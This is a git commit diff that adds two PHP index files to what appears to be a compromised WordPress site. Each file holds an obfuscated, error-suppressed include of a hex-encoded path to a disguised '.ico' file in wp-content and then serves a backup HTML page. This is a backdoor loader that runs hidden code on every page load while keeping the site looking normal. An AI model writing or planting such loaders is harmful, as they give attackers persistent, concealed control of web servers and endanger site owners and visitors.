44f323cc1195e1d56229fb4520e4f52bd1f6f227
Rodrigo Varas <rvaras@ceapro.cl>
2018-09-14 00:25:13 -0300

    first commit

---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+/*7f1ef*/
+
+@include "\x2fhome\x2fceap\x72ocl/\x70ubli\x63_htm\x6c/wp-\x63onte\x6et/la\x6eguag\x65s/th\x65mes/\x66avic\x6fn_f9\x31d17.\x69co";
+
+/*7f1ef*/
+
+
+echo file_get_contents('index.html.bak.bak');
---
+++ nivrfb/index.php
@@ -0,0 +1,9 @@
+<?php
+/*57959*/
+
+@include "\x2fhom\x65/ce\x61pro\x63l/p\x75bli\x63_ht\x6dl/w\x70-co\x6eten\x74/la\x6egua\x67es/\x74hem\x65s/f\x61vic\x6fn_f\x391d1\x37.ic\x6f";
+
+/*57959*/
+
+
+echo file_get_contents('index.html.bak.bak');
